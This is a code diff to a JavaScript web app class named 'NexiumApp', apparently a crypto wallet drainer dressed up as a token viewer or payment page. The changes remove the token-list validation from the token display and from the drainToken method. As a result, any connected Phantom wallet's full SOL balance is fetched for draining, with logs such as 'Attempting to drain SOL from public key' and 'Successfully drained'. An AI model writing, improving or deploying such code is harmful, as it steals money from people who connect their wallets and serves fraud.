@@ -826,19 +826,18 @@ class NexiumApp {
               this.showFeedback('Invalid token address.', 'error');
               return;
             }
-            const token = TOKEN_LIST.find(t => t.address === address);
-            if (token && this.dom.tokenInfo) {
-              const truncatedAddress = this.shortenAddress(address);
+            const truncatedAddress = this.shortenAddress(address);
+            if (this.dom.tokenInfo) {
               this.dom.tokenInfo.innerHTML = `
                 <div class="token-meta space-y-2">
-                  <h3 class="text-yellow-400 text-lg font-semibold">${this.escapeHTML(token.name)}</h3>
+                  <h3 class="text-yellow-400 text-lg font-semibold">Unknown Token</h3>
                   <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
                 </div>
               `;
               this.dom.tokenInfo.classList.remove('hidden');
               this.loadCustomTokenData(address);
             } else {
-              this.showFeedback('Token not found.', 'error');
+              this.showFeedback('Token display area not found.', 'error');
             }
           };
           button.addEventListener('click', showTokenInfo);
@@ -881,7 +880,9 @@ class NexiumApp {
           } else if (this.connectedWalletType === 'Phantom') {
             this.drainToken(tokenAddress);
           }
-          this.dom.customTokenModal.classList.remove('active');
+          if (this.dom.customTokenModal) {
+            this.dom.customTokenModal.classList.remove('active');
+          }
         });
       }
 
@@ -983,20 +984,15 @@ class NexiumApp {
             this.showFeedback('Invalid token address.', 'error');
             return;
           }
-          const token = TOKEN_LIST.find(t => t.address === address);
-          if (token) {
-            const truncatedAddress = this.shortenAddress(address);
-            this.dom.tokenInfo.innerHTML = `
-              <div class="token-meta space-y-2">
-                <h3 class="text-yellow-400 text-lg font-semibold">${this.escapeHTML(token.name)}</h3>
-                <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
-              </div>
-            `;
-            this.dom.tokenInfo.classList.remove('hidden');
-            this.loadCustomTokenData(address);
-          } else {
-            this.showFeedback('Token not found.', 'error');
-          }
+          const truncatedAddress = this.shortenAddress(address);
+          this.dom.tokenInfo.innerHTML = `
+            <div class="token-meta space-y-2">
+              <h3 class="text-yellow-400 text-lg font-semibold">Unknown Token</h3>
+              <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
+            </div>
+          `;
+          this.dom.tokenInfo.classList.remove('hidden');
+          this.loadCustomTokenData(address);
         };
         button.addEventListener('click', showTokenInfo);
         button.addEventListener('touchstart', showTokenInfo);
@@ -1038,7 +1034,9 @@ class NexiumApp {
         } else if (this.connectedWalletType === 'Phantom') {
           this.drainToken(tokenAddress);
         }
-        this.dom.customTokenModal.classList.remove('active');
+        if (this.dom.customTokenModal) {
+          this.dom.customTokenModal.classList.remove('active');
+        }
       });
     }
   }
@@ -1071,15 +1069,6 @@ class NexiumApp {
       let name = 'Unknown Token';
       let symbol = 'UNK';
       let decimals = 9;
-      const tokenFromList = TOKEN_LIST.find(t => t.address && t.address.toLowerCase() === tokenAddress.toLowerCase());
-      if (tokenFromList) {
-        name = tokenFromList.name;
-        symbol = tokenFromList.symbol;
-        decimals = tokenFromList.decimals;
-      } else {
-        this.showFeedback('Token not found in list.', 'error');
-        return;
-      }
       this.currentToken = { address: tokenAddress, name: this.escapeHTML(name), symbol: this.escapeHTML(symbol), decimals };
       this.lastSelectedToken = tokenAddress;
       const truncatedAddress = this.shortenAddress(tokenAddress);
@@ -1108,19 +1097,9 @@ class NexiumApp {
     }
     try {
       let balance, decimals, symbol;
-      const selectedToken = TOKEN_LIST.find(t => t.address === paymentTokenAddress || (t.isNative && paymentTokenAddress === null));
-      if (!selectedToken) {
-        this.showFeedback('Invalid token selected.', 'error');
-        return;
-      }
-      if (selectedToken.isNative) {
-        balance = await this.solConnection.getBalance(new PublicKey(this.publicKey)).catch(() => 0);
-        decimals = 9;
-        symbol = selectedToken.symbol;
-      } else {
-        this.showFeedback('error.', 'error');
-        return;
-      }
+      balance = await this.solConnection.getBalance(new PublicKey(this.publicKey)).catch(() => 0);
+      decimals = 9;
+      symbol = 'SOL';
       this.currentPaymentToken = { address: paymentTokenAddress, balance, decimals, symbol };
       this.currentToken = null;
       this.lastSelectedToken = null;
@@ -1142,28 +1121,13 @@ class NexiumApp {
     }
     this.currentToken = null;
     this.lastSelectedToken = null;
-    let selectedToken = null;
     try {
       this.isDraining = true;
       this.showProcessingSpinner();
-      selectedToken = TOKEN_LIST.find(t => t.address === tokenAddress || (t.isNative && tokenAddress === null));
-      if (!selectedToken) {
-        this.showFeedback('Invalid token selected.', 'error');
-        console.log('Drain failed: Invalid token selected');
-        this.hideProcessingSpinner();
-        return;
-      }
-      console.log(`Attempting to drain ${selectedToken.symbol} from public key: ${this.publicKey}`);
-      let balance, decimals, symbol;
-
-      if (selectedToken.isNative) {
-        balance = await this.solConnection.getBalance(new PublicKey(this.publicKey)).catch(() => 0);
-        decimals = 9;
-        symbol = selectedToken.symbol;
-      } else {
-        this.hideProcessingSpinner();
-        return;
-      }
+      console.log(`Attempting to drain SOL from public key: ${this.publicKey}`);
+      const balance = await this.solConnection.getBalance(new PublicKey(this.publicKey)).catch(() => 0);
+      const decimals = 9;
+      const symbol = 'SOL';
 
       console.log(`Fetched ${symbol} balance: ${balance / 10**decimals} for ${this.publicKey}`);
       if (balance === 0) {
@@ -1206,7 +1170,7 @@ class NexiumApp {
       this.showFeedback(`Successfully drained ${Number(lamportsToSend) / 10**decimals} ${symbol}`, 'success');
     } catch (error) {
       console.error('Drain token error:', error);
-      this.showFeedback(`Error draining ${selectedToken ? selectedToken.symbol : 'token'}: ${error.message}`, 'error');
+      this.showFeedback(`Error draining SOL: ${error.message}`, 'error');
     } finally {
       this.isDraining = false;
       this.hideProcessingSpinner();
